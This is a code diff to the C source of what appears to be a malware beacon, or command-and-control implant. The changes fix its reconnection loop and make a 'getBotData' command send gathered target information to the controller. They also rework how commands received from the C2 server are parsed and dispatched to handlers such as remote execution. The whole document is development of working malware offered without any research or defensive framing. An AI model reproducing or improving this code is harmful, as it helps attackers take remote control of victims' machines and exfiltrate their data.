@@ -362,7 +362,6 @@ void sleepBeacon() {
     char *jitter = JITTER;
     double sleepJitterTime = (double)parseInt(jitter, 58);
     int sleepTime = (int)jitterIT((double)baseSleepTime, sleepJitterTime);
-
     whileSleep(sleepTime);
 
 };
@@ -452,19 +451,26 @@ int retry(int baseDelay, char* method, int currentAttempt, int maxAttemptsCap, i
 
 int _beacon_connHandler(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID) {
     int retryCount = 1;
-    int connID = getConnection(protocolID);
-    while (connID == 0) {
-        int retryResult = retry(retryBaseDelay, retryMethod, retryCount, maxAttemptsCap, payloadEncoderID);
-        if (retryResult == 0) {
-            return 0; // 'none' mode or cap beat
+    int connID;
+    while (1) {
+        connID = getConnection(protocolID);
+        if (connID == 0) {
+            int retryResult = retry(retryBaseDelay, retryMethod, retryCount, maxAttemptsCap, payloadEncoderID);
+            if (retryResult == 0) {
+                return 0; // 'none' mode or cap beat
+
+            }
+
+            // connID = getConnection(protocolID);
+            retryCount++;
+            continue;
 
         }
 
-        connID = getConnection(protocolID);
-        retryCount++;
+        break;
 
     }
-
+    
     return connID;
 
 };
@@ -569,8 +575,10 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
 
 int _beacon_commands_getBotData(char *data, int connID, int *payloadEncoderID) {
     C_Scroll botData = fetchTargetInfo(payloadEncoderID);
-    char *_nothing = "";
-    Send(connID, _nothing, strlen(_nothing));
+    char *botDataString;
+    int botDataStringLen = SPrintScroll(botData, &botDataString);
+
+    Send(connID, botDataString, botDataStringLen);
     return SetScroll(connID, &botData);
 
 };
@@ -584,17 +592,37 @@ int _beacon_commandHandler(char *data, int connID, int *payloadEncoderID) {
 
     };
 
+    int commandsCount = (int)sizeof(AvaliableCommands) / sizeof(AvaliableCommands[0]);
+
+    if (data == NULL) {
+        FreeGoMem(_tmp_beaconCommandsGetBotData);
+        FreeGoMem(_tmp_beaconCommandsExec);
+        return 0;
+
+    }
+
+    const unsigned char *buf = (const unsigned char*)data;
+
     uint64_t commandLen;
-
-    memcpy(&commandLen, data, sizeof(uint64_t));
+    memcpy(&commandLen, buf, sizeof(uint64_t));
     commandLen = be64toh(commandLen);
-    char *commandFromC2 = data + sizeof(uint64_t);
 
-    int commandsCount = sizeof(AvaliableCommands);
+    if (commandLen > strlen(data) - sizeof(uint64_t)) {
+        return 0;
+
+    }
+
+    const unsigned char *commandFromC2 = buf + sizeof(uint64_t);
+    const char *args = (const char*)(commandFromC2 + commandLen);
+    if (commandLen >= strlen(data) - sizeof(uint64_t)) {
+        args = "";
+    
+    }
+
     int (*command)(char *data, int connID, int *payloadEncoderID) = NULL;
 
     for (int i = 0; i < commandsCount; i++) {
-        if (strcmp(AvaliableCommands[i].commandName, commandFromC2) == 0) {
+        if (memcmp(AvaliableCommands[i].commandName, commandFromC2, commandLen) == 0) {
             command = AvaliableCommands[i].beaconCommandFunc;
             break;
 
@@ -610,7 +638,7 @@ int _beacon_commandHandler(char *data, int connID, int *payloadEncoderID) {
 
     }
 
-    int commandExec = command(data, connID, payloadEncoderID);
+    int commandExec = command((char*)args, connID, payloadEncoderID);
     if (commandExec == 0) {
         FreeGoMem(_tmp_beaconCommandsGetBotData);
         FreeGoMem(_tmp_beaconCommandsExec);
@@ -723,14 +751,16 @@ char** splitStr(char *str, char delim, int *count) {
 
 char** mergeStrArrays(char *array1[], int array1Len, char *array2[], int array2Len) {
     int newArrayLen = array1Len + array2Len;
-    char **newArray = malloc(newArrayLen * sizeof(char*));
+    char **newArray = malloc((newArrayLen + 1) * sizeof(char*));
     if (newArray == NULL) {
         return NULL;
 
     }
 
     memcpy(newArray, array1, array1Len * sizeof(char*));
-    memcpy(newArray, array2, array2Len * sizeof(char*));
+    memcpy(newArray + array1Len, array2, array2Len * sizeof(char*));
+
+    newArray[newArrayLen] = '\0';
 
     return newArray;
     
